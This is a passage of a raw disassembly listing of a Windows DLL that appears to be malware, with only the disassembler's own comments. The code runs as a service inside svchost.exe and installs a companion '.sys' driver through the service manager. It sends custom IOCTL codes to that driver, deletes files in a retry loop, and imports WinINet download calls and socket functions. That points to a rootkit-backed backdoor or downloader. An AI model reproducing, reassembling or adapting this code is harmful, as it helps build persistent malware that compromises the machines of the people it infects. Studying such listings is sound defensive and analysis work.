		call	ds:ControlService
		push	esi		; hSCObject
		mov	edi, eax
		call	ds:CloseServiceHandle
		mov	eax, edi
		pop	edi

loc_10002E3D:				; CODE XREF: sub_10002E05+1Cj
		pop	esi
		leave
		retn	8
sub_10002E05	endp


; =============== S U B	R O U T	I N E =======================================


; int __stdcall	sub_10002E42(SC_HANDLE hSCManager, LPCSTR lpServiceName)
sub_10002E42	proc near		; CODE XREF: sub_10002E74+28p

hSCManager	= dword	ptr  4
lpServiceName	= dword	ptr  8

		push	esi
		push	0F01FFh		; dwDesiredAccess
		push	[esp+8+lpServiceName] ;	lpServiceName
		push	[esp+0Ch+hSCManager] ; hSCManager
		call	ds:OpenServiceA
		mov	esi, eax
		test	esi, esi
		jz	short loc_10002E70
		push	edi
		push	esi		; hService
		call	ds:DeleteService
		push	esi		; hSCObject
		mov	edi, eax
		call	ds:CloseServiceHandle
		mov	eax, edi
		pop	edi

loc_10002E70:				; CODE XREF: sub_10002E42+18j
		pop	esi
		retn	8
sub_10002E42	endp


; =============== S U B	R O U T	I N E =======================================


; int __stdcall	sub_10002E74(LPCSTR lpServiceName)
sub_10002E74	proc near		; CODE XREF: sub_10002F2D+20p

lpServiceName	= dword	ptr  4

		push	esi
		push	edi
		push	0F003Fh		; dwDesiredAccess
		push	0		; lpDatabaseName
		mov	edi, ecx
		push	0		; lpMachineName
		call	ds:OpenSCManagerA
		push	[esp+8+lpServiceName] ;	lpServiceName
		mov	esi, eax
		mov	ecx, edi
		push	esi		; hSCManager
		call	sub_10002E05
		push	[esp+8+lpServiceName] ;	lpServiceName
		mov	ecx, edi
		push	esi		; hSCManager
		call	sub_10002E42
		push	esi		; hSCObject
		call	ds:CloseServiceHandle
		push	1
		pop	eax
		pop	edi
		pop	esi
		retn	4
sub_10002E74	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	sub_10002EB0(LPCSTR lpServiceName, LPCSTR lpBinaryPathName, int)
sub_10002EB0	proc near		; CODE XREF: .text:1000300Ep

lpServiceName	= dword	ptr  8
lpBinaryPathName= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		push	esi
		push	edi
		push	0F003Fh		; dwDesiredAccess
		push	0		; lpDatabaseName
		mov	esi, ecx
		push	0		; lpMachineName
		call	ds:OpenSCManagerA
		push	[ebp+lpBinaryPathName] ; lpBinaryPathName
		mov	edi, eax
		mov	ecx, esi
		push	[ebp+lpServiceName] ; lpDisplayName
		push	edi		; hSCManager
		call	sub_10002CDF
		push	[ebp+lpServiceName] ; lpServiceName
		mov	ecx, esi
		push	edi		; hSCManager
		call	sub_10002D1E
		push	[ebp+arg_8]
		mov	ecx, esi
		push	[ebp+lpServiceName]
		call	sub_10002D54
		push	edi		; hSCObject
		mov	esi, eax
		call	ds:CloseServiceHandle
		mov	eax, esi
		pop	edi
		pop	esi
		pop	ebp
		retn	0Ch
sub_10002EB0	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	sub_10002EFF(DWORD dwIoControlCode, LPVOID lpInBuffer, DWORD nInBufferSize)
sub_10002EFF	proc near		; CODE XREF: sub_10002F2D+14p
					; .text:1000301Dp ...

BytesReturned	= dword	ptr -4
dwIoControlCode	= dword	ptr  8
lpInBuffer	= dword	ptr  0Ch
nInBufferSize	= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		push	ecx
		mov	eax, [ecx+108h]
		xor	ecx, ecx
		cmp	eax, ecx
		jz	short locret_10002F29
		lea	edx, [ebp+BytesReturned]
		push	ecx		; lpOverlapped
		push	edx		; lpBytesReturned
		push	ecx		; nOutBufferSize
		push	ecx		; lpOutBuffer
		mov	[ebp+BytesReturned], ecx
		push	[ebp+nInBufferSize] ; nInBufferSize
		push	[ebp+lpInBuffer] ; lpInBuffer
		push	[ebp+dwIoControlCode] ;	dwIoControlCode
		push	eax		; hDevice
		call	ds:DeviceIoControl

locret_10002F29:			; CODE XREF: sub_10002EFF+Ej
		leave
		retn	0Ch
sub_10002EFF	endp


; =============== S U B	R O U T	I N E =======================================


sub_10002F2D	proc near		; CODE XREF: sub_1000296A+FCp
		push	esi
		mov	esi, ecx
		xor	eax, eax
		cmp	[esi+108h], eax
		jz	short loc_10002F52
		push	eax		; nInBufferSize
		push	eax		; lpInBuffer
		push	2561000Ch	; dwIoControlCode
		call	sub_10002EFF
		push	offset ServiceName ; lpServiceName
		mov	ecx, esi
		call	sub_10002E74

loc_10002F52:				; CODE XREF: sub_10002F2D+Bj
		pop	esi
		retn
sub_10002F2D	endp

; ---------------------------------------------------------------------------

loc_10002F54:				; CODE XREF: .text:10002815j
		mov	eax, offset loc_1000351F
		call	__EH_prolog
		sub	esp, 320h
		push	ebx
		push	esi
		lea	esi, [ecx+108h]
		xor	ebx, ebx
		push	edi
		mov	[ebp-10h], ecx
		cmp	[esi], ebx
		jnz	loc_1000302A
		push	3Fh
		xor	eax, eax
		pop	ecx
		lea	edi, [ebp-21Bh]
		mov	[ebp-21Ch], bl
		push	3Fh
		rep stosd
		stosw
		stosb
		pop	ecx
		xor	eax, eax
		lea	edi, [ebp-117h]
		push	0C8h
		rep stosd
		stosw
		stosb
		lea	eax, [ebp-21Ch]
		mov	byte ptr [ebp-118h], 2Eh
		push	eax
		mov	byte ptr [ebp-117h], 73h
		push	hModule
		mov	byte ptr [ebp-116h], 79h
		mov	byte ptr [ebp-115h], 73h
		mov	[ebp-114h], bl
		call	ds:GetModuleFileNameA
		lea	eax, [ebp-21Ch]
		push	2Eh
		push	eax
		call	ds:strrchr
		pop	ecx
		cmp	eax, ebx
		pop	ecx
		jz	short loc_10002FFE
		lea	ecx, [ebp-118h]
		push	ecx
		push	eax
		call	strcat
		pop	ecx
		pop	ecx

loc_10002FFE:				; CODE XREF: .text:10002FEDj
		mov	ecx, [ebp-10h]
		lea	eax, [ebp-21Ch]
		push	esi
		push	eax
		push	offset ServiceName
		call	sub_10002EB0
		mov	ecx, [ebp-10h]
		push	ebx
		push	ebx
		push	25610008h
		call	sub_10002EFF
		cmp	[esi], ebx
		jz	loc_10003103

loc_1000302A:				; CODE XREF: .text:10002F74j
		xor	eax, eax
		lea	edi, [ebp-14h]
		mov	[ebp-18h], ebx
		lea	ecx, [ebp-32Ch]
		stosd
		call	sub_10001355
		mov	esi, offset String
		mov	[ebp-4], ebx
		push	esi
		call	ds:lstrlenA
		test	eax, eax
		jz	short loc_100030CE
		push	40h
		xor	eax, eax
		pop	ecx
		lea	edi, [ebp-21Fh]
		mov	[ebp-220h], bl
		push	esi
		rep stosd
		stosw
		stosb
		lea	eax, [ebp-220h]
		push	eax
		call	ds:lstrcpyA
		lea	eax, [ebp-220h]
		push	2Fh
		push	eax
		call	ds:StrChrA
		cmp	eax, ebx
		jz	short loc_1000308A
		mov	[eax], bl

loc_1000308A:				; CODE XREF: .text:10003086j
		lea	eax, [ebp-220h]
		lea	ecx, [ebp-32Ch]
		push	eax
		call	sub_100013A7
		push	40h
		mov	[ebp-18h], eax
		pop	ecx
		xor	eax, eax
		lea	edi, [ebp-11Bh]
		mov	[ebp-11Ch], bl
		rep stosd
		stosw
		push	esi
		lea	ecx, [ebp-32Ch]
		stosb
		call	sub_10001656
		test	eax, eax
		jz	short loc_100030E1
		lea	eax, [ebp-11Ch]
		push	eax
		jmp	short loc_100030D3
; ---------------------------------------------------------------------------

loc_100030CE:				; CODE XREF: .text:1000304Fj
		push	offset String2

loc_100030D3:				; CODE XREF: .text:100030CCj
		lea	ecx, [ebp-32Ch]
		call	sub_100013A7
		mov	[ebp-14h], eax

loc_100030E1:				; CODE XREF: .text:100030C3j
		mov	ecx, [ebp-10h]
		lea	eax, [ebp-18h]
		push	8
		push	eax
		push	25610018h
		call	sub_10002EFF
		or	dword ptr [ebp-4], 0FFFFFFFFh
		lea	ecx, [ebp-32Ch]
		call	sub_1000139C

loc_10003103:				; CODE XREF: .text:10003024j
		mov	ecx, [ebp-0Ch]
		pop	edi
		pop	esi
		pop	ebx
		mov	large fs:0, ecx
		leave
		retn

; =============== S U B	R O U T	I N E =======================================


; BOOL __stdcall DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
_DllMain@12	proc near		; CODE XREF: DllEntryPoint+4Bp

hinstDLL	= dword	ptr  4
fdwReason	= dword	ptr  8
lpvReserved	= dword	ptr  0Ch

		mov	eax, [esp+hinstDLL]
		push	1
		mov	hModule, eax
		pop	eax
		retn	0Ch
_DllMain@12	endp


; =============== S U B	R O U T	I N E =======================================


sub_10003121	proc near		; CODE XREF: HandlerProc:loc_10003177p
					; ServiceMain+EBp ...

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8
arg_8		= dword	ptr  0Ch

		mov	eax, [esp+arg_0]
		and	ServiceStatus.dwCheckPoint, 0
		mov	ServiceStatus.dwCurrentState, eax
		mov	eax, [esp+arg_4]
		push	offset ServiceStatus ; lpServiceStatus
		mov	ServiceStatus.dwWin32ExitCode, eax
		mov	eax, [esp+4+arg_8]
		push	hServiceStatus	; hServiceStatus
		mov	ServiceStatus.dwControlsAccepted, 4
		mov	ServiceStatus.dwWaitHint, eax
		call	ds:SetServiceStatus
		push	1
		pop	eax
		retn
sub_10003121	endp


; =============== S U B	R O U T	I N E =======================================


; void __stdcall HandlerProc(DWORD)
HandlerProc	proc near		; DATA XREF: ServiceMain+98o

arg_0		= dword	ptr  4

		mov	eax, [esp+arg_0]
		push	0
		dec	eax
		push	0
		jz	short loc_10003175
		push	ServiceStatus.dwCurrentState
		jmp	short loc_10003177
; ---------------------------------------------------------------------------

loc_10003175:				; CODE XREF: HandlerProc+9j
		push	1

loc_10003177:				; CODE XREF: HandlerProc+11j
		call	sub_10003121
		add	esp, 0Ch
		retn	4
HandlerProc	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_10003182	proc near		; CODE XREF: ServiceMain+F0p

var_43C		= byte ptr -43Ch
FileInformation	= dword	ptr -30h
var_2C		= byte ptr -2Ch
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4

		mov	eax, offset loc_10003537
		call	__EH_prolog
		sub	esp, 430h
		push	ebx
		push	esi
		push	edi
		push	8
		xor	ebx, ebx
		pop	ecx
		xor	eax, eax
		cmp	dword_10005168,	ebx
		lea	edi, [ebp+var_2C]
		mov	[ebp+FileInformation], ebx
		rep stosd
		jz	short loc_100031E3
		cmp	dword_1000517C,	ebx
		jnz	short loc_100031E3
		xor	edi, edi
		mov	esi, offset FileName

loc_100031BB:				; CODE XREF: sub_10003182+5Fj
		push	esi		; lpFileName
		call	ds:DeleteFileA
		lea	eax, [ebp+FileInformation]
		push	eax		; lpFileInformation
		push	ebx		; fInfoLevelId
		push	esi		; lpFileName
		call	ds:GetFileAttributesExA
		test	eax, eax
		jz	short loc_100031E3
		push	0Ah		; dwMilliseconds
		call	ds:Sleep
		inc	edi
		cmp	edi, 2710h
		jl	short loc_100031BB

loc_100031E3:				; CODE XREF: sub_10003182+28j
					; sub_10003182+30j ...
		lea	ecx, [ebp+var_43C]
		call	sub_100025A4
		lea	ecx, [ebp+var_43C]
		mov	[ebp+var_4], ebx
		call	sub_1000296A
		or	[ebp+var_4], 0FFFFFFFFh
		lea	ecx, [ebp+var_43C]
		call	sub_10002619
		mov	ecx, [ebp+var_C]
		pop	edi
		pop	esi
		pop	ebx
		mov	large fs:0, ecx
		leave
		retn
sub_10003182	endp

; Exported entry   1. ServiceMain

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public ServiceMain
ServiceMain	proc near		; DATA XREF: .rdata:off_10004798o

WSAData		= WSAData ptr -290h
sz		= byte ptr -100h
var_FF		= byte ptr -0FFh

		push	ebp
		mov	ebp, esp
		sub	esp, 290h
		push	ebx
		push	edi
		push	offset dword_10005160 ;	Dst
		call	sub_10001AAB
		test	eax, eax
		pop	ecx
		jz	loc_10003322
		push	3Fh
		xor	ebx, ebx
		pop	ecx
		xor	eax, eax
		lea	edi, [ebp+var_FF]
		mov	[ebp+sz], bl
		rep stosd
		stosw
		stosb
		lea	eax, [ebp+sz]
		push	0FFh		; nSize
		push	eax		; lpFilename
		push	ebx		; hModule
		call	ds:GetModuleFileNameA
		lea	eax, [ebp+sz]
		push	eax		; lpsz
		call	ds:CharLowerA
		lea	eax, [ebp+sz]
		push	offset aSvchost_exe ; "svchost.exe"
		push	eax
		call	ds:StrStrA
		test	eax, eax
		jz	loc_1000331D
		push	63h
		xor	eax, eax
		pop	ecx
		lea	edi, [ebp+WSAData.wHighVersion]
		mov	[ebp+WSAData.wVersion],	bx
		rep stosd
		stosw
		lea	eax, [ebp+WSAData]
		push	eax		; lpWSAData
		push	202h		; wVersionRequested
		call	ds:WSAStartup
		push	offset HandlerProc ; lpHandlerProc
		push	offset ValueName ; lpServiceName
		mov	ServiceStatus.dwServiceType, 110h
		mov	ServiceStatus.dwCurrentState, 2
		mov	ServiceStatus.dwControlsAccepted, 4
		mov	ServiceStatus.dwWin32ExitCode, ebx
		mov	ServiceStatus.dwServiceSpecificExitCode, ebx
		mov	ServiceStatus.dwCheckPoint, ebx
		mov	ServiceStatus.dwWaitHint, ebx
		call	ds:RegisterServiceCtrlHandlerA
		cmp	eax, ebx
		mov	hServiceStatus,	eax
		jz	short loc_10003322
		push	ebx
		push	ebx
		push	4
		call	sub_10003121
		call	sub_10003182
		push	ebx
		push	ebx
		push	1
		call	sub_10003121
		add	esp, 18h
		jmp	short loc_10003322
; ---------------------------------------------------------------------------

loc_1000331D:				; CODE XREF: ServiceMain+6Aj
		call	sub_10001A07

loc_10003322:				; CODE XREF: ServiceMain+18j
					; ServiceMain+E5j ...
		pop	edi
		pop	ebx
		leave
		retn	8
ServiceMain	endp

; [00000006 BYTES: COLLAPSED FUNCTION operator delete(void *). PRESS KEYPAD "+"	TO EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION operator new(uint). PRESS	KEYPAD "+" TO EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION memset. PRESS KEYPAD "+" TO EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION memcpy. PRESS KEYPAD "+" TO EXPAND]
; [0000002F BYTES: COLLAPSED FUNCTION __alloca_probe. PRESS KEYPAD "+" TO EXPAND]
		align 10h
; [00000006 BYTES: COLLAPSED FUNCTION strcpy. PRESS KEYPAD "+" TO EXPAND]
; ---------------------------------------------------------------------------

loc_10003376:				; CODE XREF: .text:1000350Cj
					; .text:10003524j ...
		jmp	ds:__CxxFrameHandler
; ---------------------------------------------------------------------------
		align 10h
; [0000001F BYTES: COLLAPSED FUNCTION __EH_prolog. PRESS KEYPAD	"+" TO EXPAND]
		align 10h
; [00000006 BYTES: COLLAPSED FUNCTION strcat. PRESS KEYPAD "+" TO EXPAND]
; [000000AB BYTES: COLLAPSED FUNCTION _CRT_INIT(x,x,x).	PRESS KEYPAD "+" TO EXPAND]
; [0000009D BYTES: COLLAPSED FUNCTION DllEntryPoint. PRESS KEYPAD "+" TO EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION _initterm. PRESS KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_100034F4	proc near		; DATA XREF: .rdata:stru_10004138o
		lea	ecx, [ebp-158h]
		jmp	sub_1000139C
sub_100034F4	endp


; =============== S U B	R O U T	I N E =======================================


sub_100034FF	proc near		; DATA XREF: .rdata:stru_10004138o
		lea	ecx, [ebp-4Ch]
		jmp	nullsub_1
sub_100034FF	endp

; ---------------------------------------------------------------------------

loc_10003507:				; DATA XREF: sub_10002620o
		mov	eax, offset stru_10004138
		jmp	loc_10003376
; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_10003514	proc near		; DATA XREF: .rdata:stru_10004168o
		lea	ecx, [ebp-32Ch]
		jmp	sub_1000139C
sub_10003514	endp

; ---------------------------------------------------------------------------

loc_1000351F:				; DATA XREF: .text:loc_10002F54o
		mov	eax, offset stru_10004168
		jmp	loc_10003376
; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_1000352C	proc near		; DATA XREF: .rdata:stru_10004190o
		lea	ecx, [ebp-43Ch]
		jmp	sub_10002619
sub_1000352C	endp

; ---------------------------------------------------------------------------

loc_10003537:				; DATA XREF: sub_10003182o
		mov	eax, offset stru_10004190
		jmp	loc_10003376
; ---------------------------------------------------------------------------
; START	OF FUNCTION CHUNK FOR sub_10001000

loc_10003541:				; CODE XREF: sub_10001000+1Dj
		call	sub_10001000
		jmp	loc_10001022
; END OF FUNCTION CHUNK	FOR sub_10001000
; ---------------------------------------------------------------------------
		align 4
		dd 2Dh dup(0)
		dd 280h	dup(?)
_text		ends

; Section 2. (virtual address 00004000)
; Virtual size			: 000007BF (   1983.)
; Section size in file		: 00000800 (   2048.)
; Offset to raw	data for section: 00002A00
; Flags	40000040: Data Readable
; Alignment	: default
;
; Imports from ADVAPI32.dll
;
; ===========================================================================

; Segment type:	Externs
; _idata
; LSTATUS __stdcall RegOpenKeyExA(HKEY hKey, LPCSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY	phkResult)
		extrn RegOpenKeyExA:dword ; CODE XREF: sub_1000296A+193p
					; DATA XREF: sub_1000296A+193r	...
; LSTATUS __stdcall RegDeleteValueA(HKEY hKey, LPCSTR lpValueName)
		extrn RegDeleteValueA:dword ; CODE XREF: sub_1000296A+1A5p
					; DATA XREF: sub_1000296A+1A5r
; LSTATUS __stdcall RegCreateKeyExA(HKEY hKey, LPCSTR lpSubKey,	DWORD Reserved,	LPSTR lpClass, DWORD dwOptions,	REGSAM samDesired, const LPSECURITY_ATTRIBUTES lpSecurityAttributes, PHKEY phkResult, LPDWORD lpdwDisposition)
		extrn RegCreateKeyExA:dword ; CODE XREF: sub_10001D65+2Bp
					; sub_10001E55+1ACp
					; DATA XREF: ...
; LSTATUS __stdcall RegSetValueExA(HKEY	hKey, LPCSTR lpValueName, DWORD	Reserved, DWORD	dwType,	const BYTE *lpData, DWORD cbData)
		extrn RegSetValueExA:dword ; CODE XREF:	sub_10001D65+DDp
					; sub_10001E55+1F6p
					; DATA XREF: ...
; LSTATUS __stdcall RegCloseKey(HKEY hKey)
		extrn RegCloseKey:dword	; CODE XREF: sub_10001D65+E6p
					; sub_10001E55+1FFp ...
; BOOL __stdcall DeleteService(SC_HANDLE hService)
		extrn DeleteService:dword ; CODE XREF: sub_10001D19+37p
					; sub_10002E42+1Cp
					; DATA XREF: ...
; SC_HANDLE __stdcall CreateServiceA(SC_HANDLE hSCManager, LPCSTR lpServiceName, LPCSTR	lpDisplayName, DWORD dwDesiredAccess, DWORD dwServiceType, DWORD dwStartType, DWORD dwErrorControl, LPCSTR lpBinaryPathName, LPCSTR lpLoadOrderGroup, LPDWORD lpdwTagId, LPCSTR	lpDependencies,	LPCSTR lpServiceStartName, LPCSTR lpPassword)
		extrn CreateServiceA:dword ; CODE XREF:	sub_10001BC3+11Fp
					; sub_10002CDF+23p
					; DATA XREF: ...
; BOOL __stdcall ChangeServiceConfig2A(SC_HANDLE hService, DWORD dwInfoLevel, LPVOID lpInfo)
		extrn ChangeServiceConfig2A:dword ; CODE XREF: sub_10001BC3+141p
					; DATA XREF: sub_10001BC3+141r
; SC_HANDLE __stdcall OpenSCManagerA(LPCSTR lpMachineName, LPCSTR lpDatabaseName, DWORD	dwDesiredAccess)
		extrn OpenSCManagerA:dword ; CODE XREF:	sub_10001B73+Bp
					; sub_10001BC3+13p ...
; SC_HANDLE __stdcall OpenServiceA(SC_HANDLE hSCManager, LPCSTR	lpServiceName, DWORD dwDesiredAccess)
		extrn OpenServiceA:dword ; CODE	XREF: sub_10001B73+21p
					; sub_10001D19+21p ...
; BOOL __stdcall CloseServiceHandle(SC_HANDLE hSCObject)
		extrn CloseServiceHandle:dword ; CODE XREF: sub_10001B73+2Ep
					; sub_10001B73+48p ...
; BOOL __stdcall StartServiceA(SC_HANDLE hService, DWORD dwNumServiceArgs, LPCSTR *lpServiceArgVectors)
		extrn StartServiceA:dword ; CODE XREF: sub_10001B73+3Bp
					; sub_10002D1E+20p
					; DATA XREF: ...
; BOOL __stdcall SetServiceStatus(SERVICE_STATUS_HANDLE	hServiceStatus,	LPSERVICE_STATUS lpServiceStatus)
		extrn SetServiceStatus:dword ; CODE XREF: sub_10003121+37p
					; DATA XREF: sub_10003121+37r
; SERVICE_STATUS_HANDLE	__stdcall RegisterServiceCtrlHandlerA(LPCSTR lpServiceName, LPHANDLER_FUNCTION lpHandlerProc)
		extrn RegisterServiceCtrlHandlerA:dword	; CODE XREF: ServiceMain+D8p
					; DATA XREF: ServiceMain+D8r
; BOOL __stdcall ControlService(SC_HANDLE hService, DWORD dwControl, LPSERVICE_STATUS lpServiceStatus)
		extrn ControlService:dword ; CODE XREF:	sub_10002E05+26p
					; DATA XREF: sub_10002E05+26r

;
; Imports from KERNEL32.dll
;
; FARPROC __stdcall GetProcAddress(HMODULE hModule, LPCSTR lpProcName)
		extrn GetProcAddress:dword ; CODE XREF:	.text:10002797p
					; .text:100027E2p ...
; void __stdcall Sleep(DWORD dwMilliseconds)
		extrn Sleep:dword	; CODE XREF: .text:10002789p
					; sub_1000296A+7Ap ...
; BOOL __stdcall FreeLibrary(HMODULE hLibModule)
		extrn FreeLibrary:dword	; CODE XREF: .text:100027A4p
					; .text:100027ADp ...
; BOOL __stdcall GetFileAttributesExA(LPCSTR lpFileName, GET_FILEEX_INFO_LEVELS	fInfoLevelId, LPVOID lpFileInformation)
		extrn GetFileAttributesExA:dword ; CODE	XREF: sub_10003182+46p
					; DATA XREF: sub_10003182+46r
; BOOL __stdcall CloseHandle(HANDLE hObject)
		extrn CloseHandle:dword	; CODE XREF: sub_100012C4+81p
					; sub_1000143D+133p ...
; HMODULE __stdcall LoadLibraryA(LPCSTR	lpLibFileName)
		extrn LoadLibraryA:dword ; CODE	XREF: sub_10002620+C5p
					; .text:10002764p ...
; UINT __stdcall GetSystemDirectoryA(LPSTR lpBuffer, UINT uSize)
		extrn GetSystemDirectoryA:dword	; CODE XREF: sub_10001BC3+D1p
					; DATA XREF: sub_10001BC3+D1r
; LPSTR	__stdcall lstrcatA(LPSTR lpString1, LPCSTR lpString2)
		extrn lstrcatA:dword	; CODE XREF: sub_10001BC3+EBp
					; sub_10001BC3+FAp
					; DATA XREF: ...
; DWORD	__stdcall GetModuleFileNameA(HMODULE hModule, LPCH lpFilename, DWORD nSize)
		extrn GetModuleFileNameA:dword ; CODE XREF: sub_10001AAB+33p
					; sub_1000281A+76p ...
; DWORD	__stdcall GetFileSize(HANDLE hFile, LPDWORD lpFileSizeHigh)
		extrn GetFileSize:dword	; CODE XREF: sub_10001A27+33p
					; DATA XREF: sub_10001A27+33r
; BOOL __stdcall ReadFile(HANDLE hFile,	LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped)
		extrn ReadFile:dword	; CODE XREF: sub_10001A27+6Dp
					; DATA XREF: sub_10001A27+6Dr
; DWORD	__stdcall GetTempPathA(DWORD nBufferLength, LPSTR lpBuffer)
		extrn GetTempPathA:dword ; CODE	XREF: sub_10001656+64p
					; sub_1000296A+149p
					; DATA XREF: ...
; DWORD	__stdcall GetCurrentThreadId()
		extrn GetCurrentThreadId:dword ; CODE XREF: sub_10001656+6Ap
					; DATA XREF: sub_10001656+6Ar
; BOOL __stdcall DeleteFileA(LPCSTR lpFileName)
		extrn DeleteFileA:dword	; CODE XREF: sub_10001656+DAp
					; .text:100027B4p ...
; int __stdcall	lstrlenA(LPCSTR	lpString)
		extrn lstrlenA:dword	; CODE XREF: sub_10001590+84p
					; sub_10001590+9Cp ...
; int __stdcall	lstrcmpA(LPCSTR	lpString1, LPCSTR lpString2)
		extrn lstrcmpA:dword	; CODE XREF: sub_1000143D+C6p
					; DATA XREF: sub_1000143D+C6r
; LPSTR	__stdcall lstrcpyA(LPSTR lpString1, LPCSTR lpString2)
		extrn lstrcpyA:dword	; CODE XREF: sub_100013A7+2Cp
					; sub_10001590+5Bp ...
; HANDLE __stdcall CreateFileA(LPCSTR lpFileName, DWORD	dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes,	DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE	hTemplateFile)
		extrn CreateFileA:dword	; CODE XREF: sub_100012C4+4Ap
					; sub_1000143D+E2p ...
; BOOL __stdcall WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite,	LPDWORD	lpNumberOfBytesWritten,	LPOVERLAPPED lpOverlapped)
		extrn WriteFile:dword	; CODE XREF: sub_100012C4+71p
					; sub_1000143D+127p
					; DATA XREF: ...
; BOOL __stdcall DeviceIoControl(HANDLE	hDevice, DWORD dwIoControlCode,	LPVOID lpInBuffer, DWORD nInBufferSize,	LPVOID lpOutBuffer, DWORD nOutBufferSize, LPDWORD lpBytesReturned, LPOVERLAPPED	lpOverlapped)
		extrn DeviceIoControl:dword ; CODE XREF: sub_10002EFF+24p
					; DATA XREF: sub_10002EFF+24r

;
; Imports from MSVCRT.dll
;
; __declspec(dllimport)	void __cdecl operator delete(void *)
		extrn __imp_??3@YAXPAX@Z:dword ; DATA XREF: operator delete(void *)r
					; .rdata:10004240o
; __declspec(dllimport)	void * __cdecl operator	new(unsigned int)
		extrn __imp_??2@YAPAXI@Z:dword ; DATA XREF: operator new(uint)r
		extrn _adjust_fdiv:dword ; DATA	XREF: _CRT_INIT(x,x,x):loc_100033BCr
; void *__cdecl	malloc(size_t Size)
		extrn malloc:dword	; CODE XREF: _CRT_INIT(x,x,x)+2Ep
					; DATA XREF: _CRT_INIT(x,x,x)+2Er
		extrn __imp__initterm:dword ; DATA XREF: _inittermr
; void __cdecl free(void *Memory)
		extrn free:dword	; CODE XREF: _CRT_INIT(x,x,x)+96p
					; DATA XREF: _CRT_INIT(x,x,x)+96r
; char *__cdecl	strcat(char *Dest, const char *Source)
		extrn __imp_strcat:dword ; DATA	XREF: strcatr
		extrn _beginthread:dword ; CODE	XREF: sub_1000296A+2Ap
					; sub_1000296A+3Ep ...
; char *__cdecl	strrchr(const char *Str, int Ch)
		extrn strrchr:dword	; CODE XREF: sub_1000281A+85p
					; sub_100028CB+6Fp ...
		extrn __CxxFrameHandler:dword ;	DATA XREF: .text:loc_10003376r
; char *__cdecl	strcpy(char *Dest, const char *Source)
		extrn __imp_strcpy:dword ; DATA	XREF: strcpyr
; void *__cdecl	memcpy(void *Dst, const	void *Src, size_t Size)
		extrn __imp_memcpy:dword ; DATA	XREF: memcpyr
; void *__cdecl	memset(void *Dst, int Val, size_t Size)
		extrn __imp_memset:dword ; DATA	XREF: memsetr

;
; Imports from SHLWAPI.dll
;
		extrn StrChrA:dword	; CODE XREF: sub_10001590+8Bp
					; .text:1000307Ep
					; DATA XREF: ...
		extrn StrToIntA:dword	; CODE XREF: sub_10001656+144p
					; DATA XREF: sub_10001656+144r
		extrn StrStrA:dword	; CODE XREF: sub_10001590+6Bp
					; ServiceMain+62p
					; DATA XREF: ...

;
; Imports from USER32.dll
;
; LPSTR	__stdcall CharLowerA(LPSTR lpsz)
		extrn CharLowerA:dword	; CODE XREF: ServiceMain+50p
					; DATA XREF: ServiceMain+50r ...
; int wsprintfA(LPSTR, LPCSTR, ...)
		extrn wsprintfA:dword	; CODE XREF: sub_10001590+48p
					; sub_10001656+3Cp ...

;
; Imports from WININET.dll
;
		extrn InternetCloseHandle:dword	; CODE XREF: sub_1000143D+13Cp
					; sub_1000143D+146p
					; DATA XREF: ...
		extrn HttpQueryInfoA:dword ; CODE XREF:	sub_1000143D+AAp
					; DATA XREF: sub_1000143D+AAr
		extrn InternetOpenUrlA:dword ; CODE XREF: sub_1000143D+39p
					; DATA XREF: sub_1000143D+39r
		extrn InternetOpenA:dword ; CODE XREF: sub_1000143D+19p
					; DATA XREF: sub_1000143D+19r
		extrn InternetReadFile:dword ; CODE XREF: sub_1000143D+108p
					; DATA XREF: sub_1000143D+108r

;
; Imports from WS2_32.dll
;
; int __stdcall	closesocket(SOCKET s)
		extrn closesocket:dword	; CODE XREF: sub_1000139C+524p
					; sub_100018E6+10Ep
					; DATA XREF: ...
; int __stdcall	send(SOCKET s, const char *buf,	int len, int flags)
		extrn send:dword	; CODE XREF: sub_10001850+23p
					; DATA XREF: sub_10001850+23r
; int __stdcall	setsockopt(SOCKET s, int level,	int optname, const char	*optval, int optlen)
		extrn setsockopt:dword	; CODE XREF: sub_100018E6+103p
					; DATA XREF: sub_100018E6+103r
; struct hostent *__stdcall gethostbyname(const	char *name)
		extrn gethostbyname:dword ; CODE XREF: sub_100013A7+4Fp
					; sub_100018E6+5Fp
					; DATA XREF: ...
; char *__stdcall inet_ntoa(struct in_addr in)
		extrn inet_ntoa:dword	; CODE XREF: sub_100013A7+83p
					; sub_100018E6+97p
					; DATA XREF: ...
; int __stdcall	connect(SOCKET s, const	struct sockaddr	*name, int namelen)
		extrn connect:dword	; CODE XREF: sub_100018E6+E0p
					; DATA XREF: sub_100018E6+E0r
; SOCKET __stdcall socket(int af, int type, int	protocol)
		extrn socket:dword	; CODE XREF: sub_100018E6+CCp
					; DATA XREF: sub_100018E6+CCr
; u_short __stdcall htons(u_short hostshort)
		extrn htons:dword	; CODE XREF: sub_100018E6+B6p
					; DATA XREF: sub_100018E6+B6r
; int __stdcall	recv(SOCKET s, char *buf, int len, int flags)
		extrn recv:dword	; CODE XREF: sub_1000270D+23p
					; DATA XREF: sub_1000270D+23r
; unsigned __int32 __stdcall inet_addr(const char *cp)
		extrn inet_addr:dword	; CODE XREF: sub_100013A7+3Fp
